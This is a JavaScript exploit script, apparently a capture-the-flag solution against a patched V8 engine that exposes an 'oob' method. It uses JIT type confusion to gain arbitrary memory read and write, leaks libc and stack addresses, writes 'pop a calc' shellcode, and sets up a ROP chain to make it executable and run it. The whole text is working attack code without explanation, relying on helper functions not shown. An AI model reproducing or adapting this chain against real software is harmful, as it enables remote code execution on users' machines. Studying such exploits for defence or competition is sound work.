
a = [1.1,1.2,1.3,1.4,1.5,1.6,1.7];
b = new Array(Array,Array);
obj = new ArrayBuffer(0x200);
vic = new ArrayBuffer(0x200);
o = {
    x1:1.2,
    x2:1.2,
    x3:1.2,
    x4:1.2,
    x5:1.2,
    x6:1.2,
    x7:1.2,
    x8:1.2,
    x9:1.2,
    x10:1.2,
    x11:1.2,
    x12:1.2,
    x13:1.2,
    x14:1.2,
    x15:1.2,
    x16:1.2,
    x17:1.2,
    x18:1.2,
    x19:1.2,
    x20:1.2,
    x21:1.2,
    x22:1.2,
    x23:1.2,
    x24:1.2,
    x25:1.2,
    x26:1.2,
    x27:1.2,
    x28:1.2,
    x29:1.2,
    x30:1.3,
    x31:1.3,
}
function trick_write(o,value){
    o.x14 = value;
}
function trick_read(o){
    return o.x4;
}
gc();


trick_write(o,1.3);
trick_read(o);
for(var i=0; i< 1000000; i++){
    trick_write(o,1.12);
    trick_read(o);
}
a_map = a.oob().f2i();
o_map = a_map + 0x10ef0n;
a.oob(o_map.i2f());
addr = trick_read(a).f2i() - 0x41n;
console.log(addr.hex());
tmp = addr + 0xc0n;
trick_write(a,tmp.i2f());
handler = new BigUint64Array(obj);

function read(addr){
    handler[0] = BigInt(addr);
    t = new BigUint64Array(vic);
    return t[0];
}
function write(addr,value){
    handler[0] = BigInt(addr);
    t = new BigUint64Array(vic);
    t[0] = BigInt(value);
}

ptr1 = read(addr + 0x50n);// Array
ptr2 = read(ptr1 + 0x2fn);
ptr3 = read(ptr2 + 0x3fn);
elf_addr = (ptr3 >> 16n) - 0x43c8fa0n;
libc_addr = read(elf_addr + 0x9545368n) - 0x21ab0n;

stack = read(libc_addr + 0x3ee098n);

// pop a calc
code = [ 0xbe850c03148n,0x59414c5053494400n,0x6ae2894800303a3dn,0x752f0000000fe800n,0x782f6e69622f7273n,0xe6894800636c6163n,0x3bc0c7483e8b48n,0xf4050f0000n ];

for(var i=0;i<code.length;i++){
    write(stack + 0x100n + BigInt(i)*8n, BigInt(code[i]));
}

rop = [
    libc_addr + 0x2155fn,// pop rdi
    (stack + 0x100n) & (~0xfffn),
    libc_addr + 0x1306d9n,// pop rdx,rsi
    0x7,
    0x1000,
    libc_addr + 0x11bae0n,
    stack+0x100n
]

function foo(x){
    if(x >0 ){
        foo(x-1);
    }else{
        start = 0x2000n;
        for(var i=0;i<rop.length;i++){
            write(stack - start + BigInt(i)*8n,rop[i]);
        }
        for(var i=0;i<0x106;i++){
            write(stack - start -8n - BigInt(i)*8n,libc_addr + 0x520efn);
        }
    }
}
foo(10000);
